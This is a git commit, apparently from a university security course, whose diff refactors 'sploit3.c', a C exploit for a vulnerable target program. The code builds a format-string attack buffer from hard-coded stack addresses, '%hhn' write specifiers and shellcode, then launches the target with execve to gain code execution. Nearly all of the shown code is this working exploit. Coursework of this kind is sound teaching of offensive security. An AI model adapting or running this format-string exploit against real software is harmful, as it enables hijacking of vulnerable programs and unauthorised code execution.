e1fdccd44a4370842c7bdcd60235b0de52c70b40
Soroush Karami <skaram5@uic.edu>
2017-09-28 19:23:25 +0000

    sploit3 was completed

--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -9,25 +9,21 @@
 
 int main(void)
 {
-	char *args[3];
-	char *env[1];
-	char buf[116];
-	char * payload;
-	 
-	payload = "%08x%191x%hhn%245x%hhn%258x%hhn%191x%hhn";
-	strcpy(buf,   "\x64\xfd\xff\xbe");
-	strcpy(buf+4, "ZZZZ");
-	strcpy(buf+8, "\x65\xfd\xff\xbe"); 
-	strcpy(buf+12, "ZZZZ");
-	strcpy(buf+16, "\x66\xfd\xff\xbe"); 
-	strcpy(buf+20, "ZZZZ"); 		
-	strcpy(buf+24, "\x67\xfd\xff\xbe");
-	strcpy(buf+28, shellcode);
-	strcat(buf, payload);
-	strcat(buf, "\x00");
-
-	args[0] = TARGET; args[1]=buf; args[2]=NULL;
-	env[0]=NULL;
+	char arg1[116];
+	char *args[]={TARGET, arg1, NULL};
+	char *env[] = {NULL};
+	
+	char * payload = "%08x%191x%hhn%245x%hhn%258x%hhn%191x%hhn";
+	strcpy(arg1,   "\x64\xfd\xff\xbe");
+	strcpy(arg1+4, "ZZZZ");
+	strcpy(arg1+8, "\x65\xfd\xff\xbe"); 
+	strcpy(arg1+12, "ZZZZ");
+	strcpy(arg1+16, "\x66\xfd\xff\xbe"); 
+	strcpy(arg1+20, "ZZZZ"); 		
+	strcpy(arg1+24, "\x67\xfd\xff\xbe");
+	strcpy(arg1+28, shellcode);
+	strcat(arg1, payload);
+	strcat(arg1, "\x00");
 
 	if(0>execve(TARGET, args, env))
 		fprintf(stderr, "execve failed.\n");
